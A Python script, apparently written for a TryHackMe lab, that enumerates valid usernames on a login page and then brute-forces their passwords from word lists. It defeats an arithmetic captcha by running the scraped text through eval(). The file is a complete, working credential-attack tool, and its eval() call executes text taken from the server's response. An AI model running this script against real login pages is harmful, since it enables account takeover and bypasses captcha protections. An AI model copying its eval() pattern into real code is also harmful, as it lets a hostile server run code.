from requests import Session
import re
import time

#change the tryhackme_ip to your deployed machine ip
url = "tryhackme_ip/login"

usernames = open('usernames.txt', 'r').read().splitlines()
passwords = open('passwords.txt', 'r').read().splitlines()

def solve_captcha(response): 
  captcha_syntax = re.compile(r'(\s\s\d+\s[+*-/]\s\d+)\s\=\s\?')
  captcha = captcha_syntax.findall(response)
  return eval(' '.join(captcha))

#initializing a session
session = Session() 
data = {'username': 'username','password':'password'}

# create a post request to the url with the payload/data using the session opened
response = session.post(url,data=data) 

for user in usernames:
 response = session.post(url,data=data)
 data['username'] = user

 if 'Captcha enabled' in response.text:
  captcha_result = solve_captcha(response.text)
  data['captcha'] = captcha_result

 response = session.post(url,data =data)

 if 'does not exist' not in response.text:
  print(f'----> Found username: {user}')
  print(f"----> Attempting to brute forcing passowrd for user: {user}")

  for password in passwords:
   captcha_result = solve_captcha(response.text)
   data['password'] = password
   data['captcha'] = captcha_result
   response = session.post(url,data=data)

   if 'Error' not in response.text:
    print(f'----> Found Username: {user} Password: {password} ')
    exit()
   
   else:
    print(f'[*]Trying password for {user} : {password}')
 
 else:
  print(f'[*] Trying password: password for user: {user}')
